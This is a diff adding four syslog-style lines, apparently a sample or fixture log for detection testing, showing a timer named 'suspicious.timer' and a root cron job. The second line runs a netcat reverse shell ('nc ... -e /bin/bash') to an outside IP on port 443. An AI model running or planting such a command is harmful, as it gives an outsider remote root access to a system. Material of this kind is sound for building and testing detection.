@@ -1,0 +1,4 @@
+Nov 03 13:37:00 apollo systemd[1]: Started suspicious.timer.
+Nov 03 13:38:00 apollo CRON[50864]: (root) CMD (/bin/sh -c 'nc 192.0.222.148 443 -e /bin/bash >/dev/null 2>&1')
+Nov 03 13:39:00 apollo kernel: [  12580.82] audit: type=1107 msg=audit(1762177020): pid=2968 uid=0 auid=0 ses=3 exe="/usr/sbin/CRON" res=success
+Nov 03 13:40:00 apollo systemd[1]: suspicious.timer: Triggered scheduling unit.
